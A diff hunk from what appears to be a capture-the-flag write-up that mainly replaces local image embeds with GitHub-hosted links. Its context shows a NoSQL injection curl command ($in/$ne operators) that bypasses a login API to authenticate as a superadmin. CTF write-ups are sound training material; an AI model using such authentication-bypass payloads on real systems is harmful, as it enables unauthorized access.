@@ -66,13 +66,13 @@ The server hinted I needed _superadmin privileges_ for the flag.
 So I refined the payload to target those specific usernames:
 
 `curl -s -X POST "http://3.25.197.138:36909/api/auth/login" \   -H "Content-Type: application/json" \   -d '{"username":{"$in":["sysadmin","root"]},"password":{"$ne":null}}' | jq .`
-![[Pasted image 20251115202443.png]]
+![Pasted image 20251115184443.png](https://raw.githubusercontent.com/Akashvarunn14/H7ctf/main/assets/Pasted%20image%2020251115184443.png)
 
 That successfully authenticated as a **superadmin** and revealed the final flag:
 
 
 
-![[Pasted image 20251115202424.png]]
+![Pasted image 20251115184424.png](https://raw.githubusercontent.com/Akashvarunn14/H7ctf/main/assets/Pasted%20image%2020251115184424.png)
 
 ---
 
